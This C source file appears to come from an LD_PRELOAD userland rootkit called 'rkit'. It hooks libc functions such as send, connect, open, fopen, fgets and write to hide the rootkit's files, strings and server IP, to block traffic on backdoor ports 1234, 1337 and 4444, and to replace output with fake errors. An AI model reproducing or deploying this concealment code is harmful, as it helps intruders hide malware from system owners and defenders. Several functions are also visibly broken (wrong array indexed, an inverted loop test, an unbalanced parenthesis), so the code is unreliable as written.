/*
 * Copyright (C) 2022 0x80000000
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include "hooks.h"
#include "config.h"


/*
    *    src/hooks.c
    *    Date: 03/30/22
    *    Author: 0x80000000
*/


/* Blacklisted files! */
const uint8_t *blacklisted_files[] = {
  "lol.txt"
};

/* Blacklisted strings! */
const uint8_t *blacklisted_strings[] = {
  "rkit",
  "rkit.so",
  SERVER_IP
};

/* Blacklisted IP addresses! */
const uint8_t *blacklisted_ip_addresses[] = {
  "1.1.1.1",
};

/* Blacklisted ports! */
const uint32_t *blacklisted_ports[] = {
  1234, 
  1337, 
  4444
};

/**
 * @brief Checks if a string contains blacklisted files.
 * @param string The string.
 * @returns True if the blacklisted string was found, false if otherwise.
 */

bool check_blacklisted_files(const uint8_t *string) {
  for (int32_t i = 0; i < (sizeof(blacklisted_files) / sizeof(blacklisted_files[0])); i++)
    if (strstr(string, blacklisted_strings[i]))
      return true;
  return false;
}

/**
 * @brief Checks if a string contains blacklisted strings.
 * @param string The string.
 * @returns True if the blacklisted string was found, false if otherwise.
 */

bool check_blacklisted_strings(const uint8_t *string) {
  for (int32_t i = 0; i < (sizeof(blacklisted_strings) / sizeof(blacklisted_strings[0])); i++)
    if (strstr(string, blacklisted_strings[i]))
      return true;
  return false;
}

/**
 * @brief Checks if a string contains blacklisted IP addresses.
 * @param string The string.
 * @returns True if the blacklisted string was found, false if otherwise.
 */

bool check_blacklisted_ip_addresses(const uint8_t *string) {
  for (int32_t i = 0; i < (sizeof(blacklisted_ip_addresses) / sizeof(blacklisted_ip_addresses[0])); i++)
    if (strstr(string, blacklisted_ip_addresses[i]))
      return true;
  return false;
}

/**
 * @brief Checks for suspicious/blacklisted ports.
 * @param network_information The struct containing parsed information from '/proc/self/net/tcp'.
 * @returns True if the blacklisted port was found, false if otherwise.
 */

bool check_suspicious_ports(tcp_t *network_information) {
#ifdef DEBUG
  rkit_log(
    "Inode found! Details: %d: %x:%x %x:%x",
    &network_information->sl,
    &network_information->local_address,
    &network_information->local_port,
    &network_information->rem_address,
    &network_information->rem_port
  );
#endif

  for (int32_t i = 0; i < (sizeof(blacklisted_ports) / sizeof(blacklisted_ports[0])); i++)
    if (network_information->local_port == blacklisted_ports[i] || network_information->rem_port == blacklisted_ports[i])
      return true;
  
  return false;
}

/**
 * @brief Parses given lines from '/proc/self/net/tcp'.
 * @param string The string containing the information.
 * @param network_information The struct that the information will be stored in.
 * @returns network_information A struct containing parsed information from /proc/<pid>/maps.
 */

tcp_t *parse_tcp_data(const uint8_t *string, tcp_t *network_information) {
  sscanf(
    string, 
    "%d: %x:%x %x:%x", 
    &network_information->sl, 
    &network_information->local_address, 
    &network_information->local_port, 
    &network_information->rem_address, 
    &network_information->rem_port
  );
  return network_information;
}

/**
 * @brief Attempts to look up a socket inode in '/proc/self/net/tcp'.
 * @param inode The inode.
 * @returns True if the inode was looked up and if used blacklisted ports were discovered, false if otherwise.
 */

bool lookup_socket_inode(const uint8_t *inode) {
  FILE *file;
  uint8_t buffer[BUFSIZ] = {0};
  tcp_t *network_information = (tcp_t *)malloc(sizeof(tcp_t));  

  if (!network_information || !(file = fopen("/proc/self/net/tcp", "r")))
    return false;  
  
  while (fgets(buffer, sizeof(buffer), file)) {
    if (strstr(buffer, inode)) {
      if (check_suspicious_ports(parse_tcp_data(buffer, network_information)))
        return true;
    }
  }

  fclose(file);
  free(network_information);

  return false;
}

/**
 * @brief Send hook, checks for blacklisted ports and strings.
 * @param sockfd The file descriptor.
 * @param buf The message.
 * @param len The length of the message.
 * @param flags The flags.
 * @returns An integer representing whether the attempt to send data was successful or not.
 */

ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
  ssize_t (*temp_send)(int sockfd, const void *buf, size_t len, int flags) = dlsym(RTLD_NEXT, "send");

#ifdef DEBUG
  rkit_log("send(); called!\n");
#endif

  if (check_blacklisted_strings(buf))
    return -1;

  FILE *file;
  DIR *directory;

  struct dirent *dir;
  uint8_t path[BUFSIZ] = {0}, buffer[BUFSIZ] = {0}, symlink[BUFSIZ] = {0};
  
  if (!(file = fopen("/proc/self/", "r")))
    return -1;

  if (!(directory = opendir("/proc/self/fd")))
    return -1;

  while (!(dir = readdir(directory))) {
    snprintf(buffer, BUFSIZ, "/proc/self/fd/%s", dir->d_name);
    readlink(path, symlink, sizeof(symlink));

    if (strstr(symlink, "socket:[")) {
      if (lookup_socket_inode(strtok(symlink, "qwertyuiopasdfghjklzxcvbnm,./;'[]{}-:")))
        return -1;
    }
  }

  fclose(file);
  closedir(directory);

  return temp_send(sockfd, buf, len, flags);
}

/**
 * @brief Connect hook, checks for blacklisted files.
 * @param sockfd The file descriptor.
 * @param addr The address.
 * @param addrlen The size of the 'addr' struct.
 * @returns An integer representing whether the connection was successful or not.
 */

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
  struct sockaddr_in *information = (struct sockaddr_in *)addr;
  int (*temp_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = dlsym(RTLD_NEXT, "connect");

#ifdef DEBUG
  rkit_log("connect(); called!\n");
  rkit_log("Remote Host: %s:%d\n", inet_ntoa(information->sin_addr), ntohs(information->sin_port));
#endif

  if (check_blacklisted_ip_addresses(inet_ntoa(information->sin_addr))
    return -1;

  return temp_connect(sockfd, addr, addrlen);
}

/**
 * @brief Open hook, checks for blacklisted files.
 * @param pathname The path to the file.
 * @param flags The mode.
 * @returns A pointer to a file object.
 */

int open(const char *pathname, int flags) {
  int (*temp_open)(const char *pathname, int flags) = dlsym(RTLD_NEXT, "open");

#ifdef DEBUG
  rkit_log("open(); called!\n");
#endif

  if (check_blacklisted_files(pathname))
    return -1;

  return temp_open(pathname, flags);
}

/**
 * @brief Fopen64 hook, checks for blacklisted files.
 * @param dirfd The file descriptor.
 * @param pathname The path to the file.
 * @param flags The mode.
 * @returns A new file descriptor.
 */

int openat(int dirfd, const char *pathname, int flags) {
  int (*temp_openat)(int dirfd, const char *pathname, int flags) = dlsym(RTLD_NEXT, "openat");

#ifdef DEBUG
  rkit_log("openat(); called!\n");
#endif

  if (check_blacklisted_files(pathname))
    return -1;

  return temp_openat(dirfd, pathname, flags);
}

/**
 * @brief Fopen hook, checks for blacklisted files.
 * @param pathname The path to the file.
 * @param mode The mode.
 * @returns A pointer to a file object.
 */

FILE *fopen(const char *pathname, const char *mode) {
  FILE *(*temp_fopen)(const char *pathname, const char *mode) = dlsym(RTLD_NEXT, "fopen");

#ifdef DEBUG
  rkit_log("fopen(); called!\n");
#endif

  if (check_blacklisted_files(pathname))
    return NULL;

  return temp_fopen(pathname, mode);
}

/**
 * @brief Fopen64 hook, checks for blacklisted files.
 * @param pathname The path to the file.
 * @param mode The mode.
 * @returns A pointer to a file object.
 */

FILE *fopen64(const char *pathname, const char *mode) {
  FILE *(*temp_fopen64)(const char *pathname, const char *mode) = dlsym(RTLD_NEXT, "fopen64");

#ifdef DEBUG
  rkit_log("fopen64(); called!\n");
#endif

  if (check_blacklisted_files(pathname))
    return NULL;

  return temp_fopen64(pathname, mode);
}

/**
 * @brief Fgets hook, checks for suspicious strings.
 * @param s The buffer.
 * @param size The size.
 * @param stream The stream that the data will be read from.
 * @returns A pointer to the string buffer.
 */

char *fgets(char *s, int size, FILE *stream) {
  char *(*temp_fgets)(char *s, int size, FILE *stream) = dlsym(RTLD_NEXT, "fgets");

#ifdef DEBUG
  rkit_log("fgets(); called!\n");
#endif

  if (check_blacklisted_strings(s))
    return "Fatal Error: fgets failed!";

  return temp_fgets(s, size, stream);
}

/**
 * @brief Write hook, checks for suspicious strings.
 * @param filedes The file descriptor.
 * @param buf The buffer.
 * @param nbytes The amount of bytes that will be written.
 * @returns The number of bytes successfully written to the file.
 */

ssize_t write(int filedes, const void *buf, size_t nbytes) {
  ssize_t (*temp_write)(int filedes, const void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "write");

#ifdef DEBUG
  rkit_log("write(); called!\n");
#endif

  if (check_blacklisted_strings(buf))
    return temp_write(filedes, "Fatal Error: write failed!\n", strlen("Fatal Error: write failed!\n"));

  return temp_write(filedes, buf, nbytes);
}